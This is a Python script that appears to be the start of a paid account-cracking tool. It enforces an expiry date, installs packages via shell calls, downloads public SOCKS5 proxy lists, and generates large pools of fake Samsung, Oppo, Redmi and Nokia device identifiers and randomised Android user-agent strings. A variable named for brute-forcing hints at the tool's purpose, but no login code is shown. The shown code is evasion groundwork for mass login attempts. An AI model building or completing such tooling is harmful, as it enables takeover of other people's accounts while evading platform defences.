import os, sys
try:
    import requests
except:
    os.system("pip install requests")

import requests
from datetime import datetime, time
#Mino Created

def katy_online():
    try:
        response = requests.get("http://worldtimeapi.org/api/ip")
        data = response.json()
        online_time_str = data['datetime']
        online_time = datetime.strptime(online_time_str, '%Y-%m-%dT%H:%M:%S.%f%z')
        return online_time.replace(second=0, microsecond=0)
    except:
        
        sys.exit("Error ")

#Mino Created
local_time = datetime.now().replace(second=0, microsecond=0)

#          years  / month  /  day   
#          ساڵ     / مانگ     / رۆژ
if datetime.now().date() < datetime(2024, 6, 3).date():
    pass
else:
    sys.exit("The Tool Has been expired buy @i4m_hawta its tool paid")


online_time = katy_online().replace(second=0, microsecond=0)

print(online_time, local_time)
if online_time.year == local_time.year \
    and online_time.month == local_time.month \
    and online_time.day == local_time.day \
    and online_time.hour == local_time.hour \
    and online_time.minute == local_time.minute:
    pass
else:
    sys.exit("The online time is different from your local time.")
    
import requests,bs4,json,os,sys,random,datetime,time,re,platform
import urllib3,rich,base64
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
os.system('pkg install speak')
os.system('pkg install espeak')
os.system('espeak -a 300 " WELCOME TO Omed TOOL"')
import requests

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]

redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]

samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]

gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	prox=open('.prox.txt','r').read().splitlines()

try:
	prox= requests.get('https://raw.githubusercontent.com/casals-ar/proxy.casals.ar/main/socks5').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	prox=open('.prox.txt','r').read().splitlines()

for x in range(1000):
    rr = random.randint
    rc = random.choice
    A7A = f"Mozilla/5.0 (Linux; Android {str(rr(3,10))}; Nokia 1000 4G Build/GRK39F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(25,100))}.0.{str(rr(2111,3999))}.{str(rr(173,299))} Mobile Safari/535.2"
    A7A1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,10))}; Nokia 3115 Build/IMM76D) AppleWebKit/537.7 (KHTML, like Gecko)  Chrome/{str(rr(25,100))}.0.{str(rr(2111,3999))}.{str(rr(73,399))} Mobile Safari/537.4"
    A7A2  = f"Mozilla/5.0 (Android; Android {str(rr(7,12))}; LG-H920 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/534.0"
